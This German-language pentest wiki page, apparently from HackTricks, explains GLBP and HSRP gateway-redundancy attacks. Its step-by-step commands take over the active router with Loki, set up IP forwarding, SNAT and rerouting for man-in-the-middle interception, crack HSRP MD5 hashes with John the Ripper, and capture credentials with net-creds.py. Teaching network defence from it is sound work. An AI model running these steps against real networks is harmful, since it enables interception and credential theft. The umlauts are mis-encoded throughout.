# GLBP & HSRP Angriffe

{% hint style="success" %}
Lernen Sie AWS-Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen Sie GCP-Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositorys senden.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## FHRP Hijacking √úberblick

### Einblicke in FHRP
FHRP ist darauf ausgelegt, Netzwerkrobustheit zu bieten, indem mehrere Router zu einer einzigen virtuellen Einheit zusammengef√ºhrt werden, um die Lastenverteilung und Ausfallsicherheit zu verbessern. Cisco Systems hat prominente Protokolle in dieser Suite eingef√ºhrt, wie z.B. GLBP und HSRP.

### GLBP Protokoll Einblicke
Ciscos Kreation, GLBP, funktioniert auf dem TCP/IP-Stack und nutzt UDP auf Port 3222 f√ºr die Kommunikation. Router in einer GLBP-Gruppe tauschen "hello"-Pakete in 3-Sekunden-Intervallen aus. Wenn ein Router es vers√§umt, diese Pakete 10 Sekunden lang zu senden, wird davon ausgegangen, dass er offline ist. Diese Timer sind jedoch nicht festgelegt und k√∂nnen ge√§ndert werden.

### GLBP Operationen und Lastverteilung
GLBP zeichnet sich dadurch aus, dass es die Lastenverteilung √ºber Router mithilfe einer einzigen virtuellen IP in Verbindung mit mehreren virtuellen MAC-Adressen erm√∂glicht. In einer GLBP-Gruppe ist jeder Router am Paketweiterleitungsprozess beteiligt. Im Gegensatz zu HSRP/VRRP bietet GLBP echtes Lastenausgleich durch verschiedene Mechanismen:

- **Host-abh√§ngiger Lastenausgleich:** Beh√§lt die Zuweisung einer konsistenten AVF-MAC-Adresse an einen Host bei, was f√ºr stabile NAT-Konfigurationen unerl√§sslich ist.
- **Round-Robin-Lastenausgleich:** Der Standardansatz, der die Zuweisung von AVF-MAC-Adressen abwechselnd unter den anfragenden Hosts durchf√ºhrt.
- **Gewichteter Round-Robin-Lastenausgleich:** Verteilt die Last basierend auf vordefinierten "Gewichts"-Metriken.

### Schl√ºsselkomponenten und Begriffe in GLBP
- **AVG (Active Virtual Gateway):** Der Hauptrouter, der f√ºr die Zuweisung von MAC-Adressen an Peer-Router verantwortlich ist.
- **AVF (Active Virtual Forwarder):** Ein Router, der zur Verwaltung des Netzwerkverkehrs bestimmt ist.
- **GLBP-Priorit√§t:** Eine Metrik, die den AVG bestimmt, beginnend mit einem Standardwert von 100 und im Bereich von 1 bis 255.
- **GLBP-Gewicht:** Spiegelt die aktuelle Last auf einem Router wider, die entweder manuell oder durch Objektverfolgung angepasst werden kann.
- **GLBP-Virtuelle IP-Adresse:** Dient als Standard-Gateway des Netzwerks f√ºr alle verbundenen Ger√§te.

F√ºr Interaktionen verwendet GLBP die reservierte Multicast-Adresse 224.0.0.102 und den UDP-Port 3222. Router senden "hello"-Pakete in 3-Sekunden-Intervallen und gelten als nicht betriebsbereit, wenn ein Paket √ºber einen Zeitraum von 10 Sekunden verpasst wird.

### GLBP Angriffsmechanismus
Ein Angreifer kann zum prim√§ren Router werden, indem er ein GLBP-Paket mit dem h√∂chsten Priorit√§tswert (255) sendet. Dies kann zu DoS- oder MITM-Angriffen f√ºhren, die das Abfangen oder Umleiten von Datenverkehr erm√∂glichen.

### Ausf√ºhren eines GLBP-Angriffs mit Loki
[Loki](https://github.com/raizo62/loki_on_kali) kann einen GLBP-Angriff durchf√ºhren, indem ein Paket mit einer Priorit√§t und einem Gewicht von 255 eingespeist wird. Vor dem Angriff sind Schritte wie das Sammeln von Informationen wie der virtuellen IP-Adresse, der Authentifizierungspr√§senz und den Router-Priorit√§tswerten mithilfe von Tools wie Wireshark erforderlich.

Angriffsschritte:
1. Wechseln Sie in den Promiskuitivmodus und aktivieren Sie die IP-Weiterleitung.
2. Identifizieren Sie den Zielrouter und rufen Sie dessen IP ab.
3. Generieren Sie eine Gratuits-ARP.
4. Injizieren Sie ein b√∂sartiges GLBP-Paket, das den AVG imitiert.
5. Weisen Sie dem Netzwerkinterface des Angreifers eine sekund√§re IP-Adresse zu, die der GLBP-Virtual-IP entspricht.
6. Implementieren Sie SNAT f√ºr eine vollst√§ndige Traffic-Sichtbarkeit.
7. Passen Sie das Routing an, um weiterhin den Internetzugriff √ºber den urspr√ºnglichen AVG-Router zu gew√§hrleisten.

Durch Befolgen dieser Schritte positioniert sich der Angreifer als "Man in the Middle", der in der Lage ist, den Netzwerkverkehr abzufangen und zu analysieren, einschlie√ülich unverschl√ºsselter oder sensibler Daten.

F√ºr die Demonstration sind hier die erforderlichen Befehlsschnipsel:
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
### Passive Erkl√§rung des HSRP-Hijackings mit Befehlsdetails

#### √úberblick √ºber HSRP (Hot Standby Router/Redundancy Protocol)
HSRP ist ein von Cisco entwickeltes Protokoll f√ºr die Redundanz des Netzwerkgateways. Es erm√∂glicht die Konfiguration mehrerer physischer Router zu einer einzigen logischen Einheit mit einer gemeinsamen IP-Adresse. Diese logische Einheit wird von einem prim√§ren Router verwaltet, der f√ºr die Weiterleitung des Datenverkehrs verantwortlich ist. Im Gegensatz zu GLBP, das Metriken wie Priorit√§t und Gewicht f√ºr die Lastverteilung verwendet, verl√§sst sich HSRP auf einen einzigen aktiven Router f√ºr das Traffic-Management.

#### Rollen und Terminologie in HSRP
- **HSRP Active Router**: Das Ger√§t, das als Gateway fungiert und den Datenverkehrsfluss verwaltet.
- **HSRP Standby Router**: Ein Backup-Router, der bereit ist, die Rolle des aktiven Routers zu √ºbernehmen, falls dieser ausf√§llt.
- **HSRP-Gruppe**: Eine Gruppe von Routern, die zusammenarbeiten, um einen einzigen widerstandsf√§higen virtuellen Router zu bilden.
- **HSRP MAC-Adresse**: Eine virtuelle MAC-Adresse, die dem logischen Router im HSRP-Setup zugewiesen ist.
- **HSRP Virtuelle IP-Adresse**: Die virtuelle IP-Adresse der HSRP-Gruppe, die als Standardgateway f√ºr verbundene Ger√§te fungiert.

#### HSRP-Versionen
HSRP gibt es in zwei Versionen, HSRPv1 und HSRPv2, die sich haupts√§chlich in der Gruppenkapazit√§t, der Verwendung von Multicast-IP und der Struktur der virtuellen MAC-Adresse unterscheiden. Das Protokoll verwendet spezifische Multicast-IP-Adressen f√ºr den Austausch von Dienstinformationen, wobei Hello-Pakete alle 3 Sekunden gesendet werden. Ein Router gilt als inaktiv, wenn innerhalb eines Intervalls von 10 Sekunden kein Paket empfangen wird.

#### HSRP-Angriffsmechanismus
HSRP-Angriffe beinhalten das gewaltsame √úbernehmen der Rolle des aktiven Routers durch das Einspritzen eines maximalen Priorit√§tswerts. Dies kann zu einem Man-In-The-Middle (MITM)-Angriff f√ºhren. Wesentliche Vor-Angriffsschritte umfassen das Sammeln von Daten √ºber das HSRP-Setup, was mit Wireshark f√ºr die Traffic-Analyse durchgef√ºhrt werden kann.

#### Schritte zum Umgehen der HSRP-Authentifizierung
1. Speichern Sie den Netzwerkverkehr, der HSRP-Daten enth√§lt, als .pcap-Datei.
```shell
tcpdump -w hsrp_traffic.pcap
```
2. Extrahieren Sie MD5-Hashes aus der .pcap-Datei mithilfe von hsrp2john.py.
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. Knacken Sie die MD5-Hashes mit John the Ripper.
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**Ausf√ºhren von HSRP-Injektion mit Loki**

1. Starten Sie Loki, um HSRP-Anzeigen zu identifizieren.
2. Setzen Sie die Netzwerkschnittstelle in den Promiscuous-Modus und aktivieren Sie IP-Weiterleitung.
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. Verwenden Sie Loki, um den spezifischen Router anzugreifen, geben Sie das geknackte HSRP-Passwort ein und f√ºhren Sie die erforderlichen Konfigurationen durch, um den aktiven Router zu imitieren.
4. Nachdem Sie die Rolle des aktiven Routers √ºbernommen haben, konfigurieren Sie Ihre Netzwerkschnittstelle und IP-Tabellen, um den legitimen Datenverkehr abzufangen.
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. √Ñndern Sie die Routing-Tabelle, um den Datenverkehr √ºber den ehemaligen aktiven Router zu leiten.
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. Verwenden Sie net-creds.py oder ein √§hnliches Dienstprogramm, um Anmeldeinformationen aus dem abgefangenen Datenverkehr zu erfassen.
```shell
sudo python2 net-creds.py -i eth0
```

Durch die Ausf√ºhrung dieser Schritte kann der Angreifer in die Lage versetzt werden, den Datenverkehr abzufangen und zu manipulieren, √§hnlich dem Verfahren f√ºr das GLBP-Hijacking. Dies verdeutlicht die Schwachstelle in Redundanzprotokollen wie HSRP und die Notwendigkeit robuster Sicherheitsma√ünahmen.
